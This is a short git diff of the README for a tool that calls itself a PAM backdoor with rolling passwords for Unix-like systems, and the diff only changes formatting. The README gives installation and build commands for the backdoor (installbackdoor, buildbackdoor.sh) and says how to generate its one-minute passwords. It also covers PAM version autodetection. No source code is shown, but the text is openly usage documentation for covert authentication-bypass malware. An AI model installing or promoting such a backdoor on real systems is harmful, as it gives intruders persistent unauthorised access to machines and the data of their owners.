@@ -7,7 +7,8 @@ PAM Backdoor with rolling passwords for NIX-based systems
 
 release includes binaries and installer for amd64 architecture.
 # usage:
-chmod +x ./installbackdoor and run it. to build use ./buildbackdoor.sh 
+*chmod +x ./installbackdoor* and run it. to build use *./buildbackdoor.sh*
+
 compile and run backdoorpass for password generation. passwords are valid only for a minute, so you gotta be quick. 
 
 in most cases it will determine PAM version automatically, but if it fails, you can use -n flag to disable autodetection.
